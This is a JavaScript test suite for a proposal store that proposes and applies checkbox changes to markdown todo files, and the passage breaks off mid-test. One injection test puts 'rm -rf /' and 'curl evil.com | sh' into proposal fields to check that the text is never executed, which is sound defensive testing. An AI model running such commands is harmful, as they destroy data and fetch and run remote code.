import { describe, it, mock } from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdirSync, rmSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

let createProposalStore;
try {
  ({ createProposalStore } = await import('../proposals.mjs'));
} catch (err) {
  createProposalStore = null;
}

function makeTestDir() {
  const dir = join(tmpdir(), `agendo-proposals-test-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);
  mkdirSync(join(dir, 'docs', 'todos'), { recursive: true });
  return dir;
}

function cleanupTestDir(dir) {
  try { rmSync(dir, { recursive: true, force: true }); } catch { /* best effort */ }
}

function writeTodo(dir, id, title, criteria, opts = {}) {
  const dirPath = join(dir, 'docs', 'todos');
  const status = opts.status ?? 'pending';
  const priority = opts.priority ?? 'p2';
  const lines = [
    '---',
    `title: ${title}`,
    `status: ${status}`,
    `priority: ${priority}`
  ];
  if (opts.group) lines.push(`group: ${opts.group}`);
  lines.push('---');
  lines.push('');
  lines.push(`# ${title}`);
  lines.push('');
  if (criteria.length) {
    lines.push('## Acceptance Criteria');
    lines.push('');
    for (const c of criteria) {
      const mark = c.met ? 'x' : ' ';
      lines.push(`- [${mark}] ${c.text}`);
    }
    lines.push('');
  }
  if (opts.scannerEvidence) {
    lines.push('<!-- agendo:scan-evidence:start -->');
    lines.push(opts.scannerEvidence);
    lines.push('<!-- agendo:scan-evidence:end -->');
    lines.push('');
  }
  if (opts.workLog) {
    lines.push('## Work Log');
    lines.push('');
    for (const entry of opts.workLog) {
      lines.push(`### ${entry.date}`);
      lines.push(entry.content);
      lines.push('');
    }
  }
  lines.push('## Notes');
  lines.push('');
  lines.push('Some unrelated notes that must be preserved.');
  lines.push('');
  const filename = `${id}-${status}-${priority}-test.md`;
  writeFileSync(join(dirPath, filename), lines.join('\n'), 'utf-8');
  return join(dirPath, filename);
}

function loadFileContent(path) {
  return readFileSync(path, 'utf-8');
}

function okGuard() {
  return async () => {};
}

describe('createProposalStore', () => {
  it('is exported and callable', () => {
    assert.ok(typeof createProposalStore === 'function', 'createProposalStore must be exported');
  });

  describe('create', () => {
    it('creates a proposal without modifying the file', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Test Todo', [
          { met: false, text: 'Criterion 1' },
          { met: false, text: 'Criterion 2' }
        ]);
        const original = loadFileContent(filePath);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'Verified', evidence: 'Test passed' }]
        });
        const after = loadFileContent(filePath);
        assert.equal(after, original, 'create must be read-only');
        assert.ok(proposal.id, 'proposal must have an id');
        assert.equal(proposal.todoId, '047');
        assert.equal(proposal.state, 'pending');
        assert.equal(proposal.changes.length, 1);
        assert.equal(proposal.changes[0].field, 'criterion.met');
        assert.equal(proposal.changes[0].criterionIndex, 0);
        assert.equal(proposal.changes[0].before, false);
        assert.equal(proposal.changes[0].after, true);
        assert.equal(proposal.changes[0].rationale, 'Verified');
        assert.equal(proposal.changes[0].evidence, 'Test passed');
        assert.equal(proposal.changes[0].state, 'pending');
        assert.ok(proposal.createdAt, 'proposal must have createdAt');
        assert.ok(proposal.revision, 'proposal must have revision');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('derives title from todo title', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'My Test Title', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });
        assert.equal(proposal.title, 'Proposed changes for My Test Title');
        assert.ok(proposal.workspaceRoot, 'must include workspaceRoot');
        assert.equal(proposal.workspaceRoot, dir);
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('rejects unknown input fields', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          title: 'extra field',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        }), /unknown field/i);
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('rejects unknown change fields', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e', extra: 'field' }]
        }), /unknown field/i);
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('supports marking criteria as unmet', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: true, text: 'Already met' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: false, rationale: 'Regressed', evidence: 'Failing' }]
        });
        assert.equal(proposal.changes[0].before, true);
        assert.equal(proposal.changes[0].after, false);
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('supports multiple changes in one proposal', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [
          { met: false, text: 'C1' },
          { met: false, text: 'C2' },
          { met: false, text: 'C3' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [
            { criterionIndex: 0, met: true, rationale: 'r1', evidence: 'e1' },
            { criterionIndex: 2, met: true, rationale: 'r2', evidence: 'e2' }
          ]
        });
        assert.equal(proposal.changes.length, 2);
        assert.equal(proposal.changes[0].criterionIndex, 0);
        assert.equal(proposal.changes[1].criterionIndex, 2);
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('assigns unique change ids', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }, { met: false, text: 'C2' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [
            { criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' },
            { criterionIndex: 1, met: true, rationale: 'r', evidence: 'e' }
          ]
        });
        assert.ok(proposal.changes[0].id !== proposal.changes[1].id, 'change ids must be unique');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('includes criterion text in changes', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'Do the thing' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });
        assert.equal(proposal.changes[0].text, 'Do the thing');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('throws on invalid todo id', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '999',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        }));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('throws on out-of-range criterion index', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 5, met: true, rationale: 'r', evidence: 'e' }]
        }));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('throws on duplicate criterion indexes in one proposal', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }, { met: false, text: 'C2' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          changes: [
            { criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' },
            { criterionIndex: 0, met: false, rationale: 'r', evidence: 'e' }
          ]
        }));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('throws on non-boolean met', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: 'yes', rationale: 'r', evidence: 'e' }]
        }));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('rejects noop changes where before equals after', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: true, text: 'Already met' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        }));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('requires non-empty rationale', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: '', evidence: 'e' }]
        }));
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: '   ', evidence: 'e' }]
        }));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('requires non-empty evidence', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: '' }]
        }));
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: '   ' }]
        }));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('validates rationale and evidence length', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r'.repeat(1001), evidence: 'e' }]
        }));
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e'.repeat(1001) }]
        }));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('only supports criterion.met field changes', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });
        for (const change of proposal.changes) {
          assert.equal(change.field, 'criterion.met');
        }
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('throws on empty changes array', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          changes: []
        }));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('throws on non-object input', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        assert.throws(() => store.create('not an object'));
        assert.throws(() => store.create(null));
        assert.throws(() => store.create([1, 2, 3]));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('detects file change during create (consistency check)', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        // Normal create should work
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });
        assert.ok(proposal.id);
      } finally {
        cleanupTestDir(dir);
      }
    });
  });

  describe('list', () => {
    it('returns empty list for todo with no proposals', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposals = store.list('047');
        assert.ok(Array.isArray(proposals));
        assert.equal(proposals.length, 0);
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('lists proposals for a todo', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test', [
          { met: false, text: 'C1' },
          { met: false, text: 'C2' }
        ]);
        const store = createProposalStore(dir);
        store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });
        store.create({
          todoId: '047',
          changes: [{ criterionIndex: 1, met: true, rationale: 'r', evidence: 'e' }]
        });
        const proposals = store.list('047');
        assert.equal(proposals.length, 2);
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('filters by todo id when provided', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Test 1', [{ met: false, text: 'C1' }]);
        writeTodo(dir, '048', 'Test 2', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });
        store.create({
          todoId: '048',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });
        const p47 = store.list('047');
        const p48 = store.list('048');
        assert.equal(p47.length, 1);
        assert.equal(p47[0].todoId, '047');
        assert.equal(p48.length, 1);
        assert.equal(p48[0].todoId, '048');
      } finally {
        cleanupTestDir(dir);
      }
    });
  });

  describe('apply', () => {
    it('applies a single selected change and updates the file', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Test', [
          { met: false, text: 'Criterion 1' },
          { met: false, text: 'Criterion 2' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'Verified', evidence: 'Test passed' }]
        });
        const result = await store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });
        const content = loadFileContent(filePath);
        assert.ok(content.includes('- [x] Criterion 1'), 'Criterion 1 should be marked met');
        assert.ok(content.includes('- [ ] Criterion 2'), 'Criterion 2 should remain unmet');
        assert.ok(result.changes[0].state === 'applied', 'Change should be applied');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('preserves unrelated notes, metadata, criteria, and EOL style', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const dirPath = join(dir, 'docs', 'todos');
        const crlfContent = [
          '---',
          'title: CRLF Test',
          'status: pending',
          'priority: p2',
          'group: test-group',
          '---',
          '',
          '# CRLF Test',
          '',
          '## Acceptance Criteria',
          '',
          '- [ ] Criterion 1',
          '- [ ] Criterion 2',
          '',
          '## Work Log',
          '',
          '### 2026-10-26',
          'Some work done.',
          '',
          '## Notes',
          '',
          'Unrelated notes.',
          ''
        ].join('\r\n');
        const filePath = join(dirPath, '047-pending-p2-crlf-test.md');
        writeFileSync(filePath, crlfContent, 'utf-8');

        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });
        await store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });

        const content = loadFileContent(filePath);
        assert.ok(content.includes('\r\n'), 'CRLF line endings must be preserved');
        assert.ok(content.includes('Unrelated notes.'), 'Notes must be preserved');
        assert.ok(content.includes('group: test-group'), 'Group metadata must be preserved');
        assert.ok(content.includes('Criterion 2'), 'Other criteria must be preserved');
        assert.ok(content.includes('Some work done.'), 'Work log must be preserved');
        assert.ok(content.includes('- [ ] Criterion 2'), 'Unselected criterion must remain unmet');
        assert.ok(content.includes('- [x] Criterion 1'), 'Selected criterion must be met');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('preserves scanner evidence block', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Scanner Test', [
          { met: false, text: 'Fix issue' }
        ], {
          scannerEvidence: 'Finding: SQL injection risk at line 42.'
        });
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'Fixed', evidence: 'PR #123' }]
        });
        await store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });

        const content = loadFileContent(filePath);
        assert.ok(content.includes('<!-- agendo:scan-evidence:start -->'), 'Scanner evidence start must be preserved');
        assert.ok(content.includes('<!-- agendo:scan-evidence:end -->'), 'Scanner evidence end must be preserved');
        assert.ok(content.includes('Finding: SQL injection risk at line 42.'), 'Scanner evidence content must be preserved');
        assert.ok(content.includes('- [x] Fix issue'), 'Criterion should be marked met');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('applies partial selection and rebases remaining changes', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Partial Test', [
          { met: false, text: 'C1' },
          { met: false, text: 'C2' },
          { met: false, text: 'C3' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [
            { criterionIndex: 0, met: true, rationale: 'r1', evidence: 'e1' },
            { criterionIndex: 1, met: true, rationale: 'r2', evidence: 'e2' },
            { criterionIndex: 2, met: true, rationale: 'r3', evidence: 'e3' }
          ]
        });

        // Apply only the first change
        await store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });
        const content = loadFileContent(filePath);
        assert.ok(content.includes('- [x] C1'), 'C1 should be met');
        assert.ok(content.includes('- [ ] C2'), 'C2 should be unmet');
        assert.ok(content.includes('- [ ] C3'), 'C3 should be unmet');

        // Proposal should still be pending (not all changes applied)
        const listed = store.list('047').find(p => p.id === proposal.id);
        assert.equal(listed.state, 'pending', 'Proposal should still be pending after partial apply');

        // Apply remaining changes
        const remainingChangeIds = listed.changes
          .filter(c => c.state === 'pending')
          .map(c => c.id);
        assert.equal(remainingChangeIds.length, 2);
        const result2 = await store.apply(proposal.id, remainingChangeIds, { assertWritable: okGuard() });
        assert.equal(result2.state, 'applied', 'Proposal should be applied after all changes');

        const finalContent = loadFileContent(filePath);
        assert.ok(finalContent.includes('- [x] C1'), 'C1 should be met');
        assert.ok(finalContent.includes('- [x] C2'), 'C2 should be met');
        assert.ok(finalContent.includes('- [x] C3'), 'C3 should be met');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('rejects stale proposal when file content changed', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Stale Test', [
          { met: false, text: 'Original criterion' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        // Modify the file externally
        writeFileSync(filePath, loadFileContent(filePath).replace('Original criterion', 'Modified criterion'), 'utf-8');

        await assert.rejects(
          store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() }),
          /stale|changed/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('rejects when file was renamed or deleted', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Rename Test', [
          { met: false, text: 'C1' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        // Delete the file
        rmSync(filePath);

        await assert.rejects(
          store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() }),
          /not found|missing/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('requires assertWritable guard when not provided', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Guard Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        await assert.rejects(
          store.apply(proposal.id, [proposal.changes[0].id], {}),
          /assertWritable|requires/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('respects guard rejection', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Guard Reject Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        const guard = async () => { throw new Error('Not writable'); };
        await assert.rejects(
          store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: guard }),
          /not writable/i
        );

        // File should be unchanged
        const content = loadFileContent(filePath);
        assert.ok(content.includes('- [ ] C1'), 'File should be unchanged after guard rejection');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('checks guard before revision', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Guard Order Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        // Make file stale AND provide a rejecting guard
        writeFileSync(filePath, loadFileContent(filePath).replace('C1', 'C1 modified'), 'utf-8');

        const guardCalled = { value: false };
        const guard = async () => {
          guardCalled.value = true;
          throw new Error('Guard failed');
        };

        await assert.rejects(
          store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: guard }),
          /guard failed/i
        );
        assert.ok(guardCalled.value, 'Guard should have been called');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('is atomic for the selected batch', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Atomic Test', [
          { met: false, text: 'C1' },
          { met: false, text: 'C2' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [
            { criterionIndex: 0, met: true, rationale: 'r1', evidence: 'e1' },
            { criterionIndex: 1, met: true, rationale: 'r2', evidence: 'e2' }
          ]
        });

        const result = await store.apply(proposal.id, proposal.changes.map(c => c.id), { assertWritable: okGuard() });
        assert.equal(result.state, 'applied');

        const content = loadFileContent(filePath);
        assert.ok(content.includes('- [x] C1'), 'C1 should be met');
        assert.ok(content.includes('- [x] C2'), 'C2 should be met');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('rejects invalid change ids', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Invalid ID Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        await assert.rejects(
          store.apply(proposal.id, ['nonexistent-id'], { assertWritable: okGuard() }),
          /not found/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('rejects change ids from different proposal', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Cross Proposal Test', [
          { met: false, text: 'C1' },
          { met: false, text: 'C2' }
        ]);
        const store = createProposalStore(dir);
        const p1 = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });
        const p2 = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 1, met: true, rationale: 'r', evidence: 'e' }]
        });

        await assert.rejects(
          store.apply(p1.id, [p2.changes[0].id], { assertWritable: okGuard() }),
          /not found/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('rejects already-applied change ids', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Already Applied Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        await store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });

        // The proposal is now applied, not pending
        await assert.rejects(
          store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() }),
          /not pending/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('handles duplicate change ids in request', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Duplicate IDs Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        await assert.rejects(
          store.apply(proposal.id, [proposal.changes[0].id, proposal.changes[0].id], { assertWritable: okGuard() }),
          /duplicate/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('rejects empty change id list', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Empty List Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        await assert.rejects(
          store.apply(proposal.id, [], { assertWritable: okGuard() }),
          /non-empty/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('detects reordered text as stale', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Reorder Test', [
          { met: false, text: 'Criterion A' },
          { met: false, text: 'Criterion B' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        // Reorder the criteria lines (changes content hash)
        const content = loadFileContent(filePath);
        const reordered = content
          .replace('- [ ] Criterion A', 'TEMP')
          .replace('- [ ] Criterion B', '- [ ] Criterion A')
          .replace('TEMP', '- [ ] Criterion B');
        writeFileSync(filePath, reordered, 'utf-8');

        await assert.rejects(
          store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() }),
          /stale|changed/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('applies to correct todo when multiple todos exist', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Target 1', [{ met: false, text: 'Unique criterion' }]);
        writeTodo(dir, '048', 'Target 2', [{ met: false, text: 'Unique criterion' }]);

        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        const result = await store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });
        assert.equal(result.state, 'applied');

        const p47 = loadFileContent(join(dir, 'docs', 'todos', '047-pending-p2-test.md'));
        const p48 = loadFileContent(join(dir, 'docs', 'todos', '048-pending-p2-test.md'));
        assert.ok(p47.includes('- [x] Unique criterion'), '047 should be updated');
        assert.ok(p48.includes('- [ ] Unique criterion'), '048 should not be updated');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('does not execute text from proposal data', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Injection Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{
            criterionIndex: 0,
            met: true,
            rationale: 'r; rm -rf /',
            evidence: 'e; curl evil.com | sh'
          }]
        });

        // Apply should work but not execute the text
        const result = await store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });
        assert.equal(result.state, 'applied');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('returns defensive copies from create', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Defensive Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        // Mutate the returned object
        proposal.changes[0].rationale = 'mutated';
        proposal.title = 'mutated';
        proposal.changes.push({ fake: true });

        // List should show original values
        const listed = store.list('047').find(p => p.id === proposal.id);
        assert.equal(listed.changes[0].rationale, 'r', 'Internal state should not be mutated');
        assert.equal(listed.title, 'Proposed changes for Defensive Test');
        assert.equal(listed.changes.length, 1, 'Internal state should not gain entries');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('handles concurrent apply and reject', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Concurrency Test', [
